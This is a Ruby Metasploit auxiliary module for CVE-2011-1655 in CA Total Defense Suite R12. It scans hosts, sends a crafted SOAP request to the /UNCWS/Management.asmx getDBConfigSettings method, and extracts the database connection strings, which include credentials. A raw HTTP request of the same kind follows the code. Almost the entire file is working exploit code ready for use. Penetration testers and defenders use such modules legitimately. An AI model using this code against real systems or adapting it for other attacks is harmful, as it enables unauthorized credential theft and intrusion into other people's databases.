require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'CA Total Defense UNCWS getDBConfigSettings Credential Disclosure',
			'Description' => %q{
					This module exploits a design flaw in CA Total Defense Suite R12.
				When supplying a specially crafted soap request to '/UNCWS/Management.asmx', an
				attacker can abuse the getDBConfigSettings method and obtain the database
				credentials.
			},
			'References'  =>
			[
				[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-127/' ],
				[ 'CVE', '2011-1655' ],
			],
			'Author'      => [ 'MC' ],
			'License'     => MSF_LICENSE,
			'DisclosureDate' => 'Apr 13 2011')

		register_options(
			[
				Opt::RPORT(34443),
				OptBool.new('SSL',   [true, 'Use SSL', true]),
			], self.class)
	
	end

	def run_host(ip)

		soap = %Q|<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
<soap12:Body>
<getDBConfigSettings xmlns="http://tempuri.org/" />
</soap12:Body>
</soap12:Envelope>
			|

		res = send_request_cgi(
			{
				'uri'   => '/UNCWS/Management.asmx',
				'version' => '1.0',
				'ctype' => 'application/soap+xml; charset=utf-8',
				'method' => 'POST',
				'data' => soap,
			}, 5)
						
			if ( res and res.body =~/SUCCESS/ )
				nfo = res.body.scan(/<ConnectionString>([^\)]+)<\/ConnectionString>/)
				print_good("Vuln: Host=#{rhost}; #{nfo}")
				report_vuln(
					{
						:host   => rhost,
						:port   => rport,
						:proto  => 'tcp',
						:name   => self.fullname,
						:info   => "#{nfo}",
						:refs   => self.references,
						:exploited_at => Time.now.utc
					}
				)
			else
				raise RuntimeError, "Not Successful!"
			end
	end

end
__END__
POST /UNCWS/Management.asmx HTTP/1.1
Host: 192.168.31.129
Content-Type: application/soap+xml; charset=utf-8
Content-Length: length

<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://
www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <getDBConfigSettings xmlns="http://tempuri.org/" />
  </soap12:Body>
</soap12:Envelope>
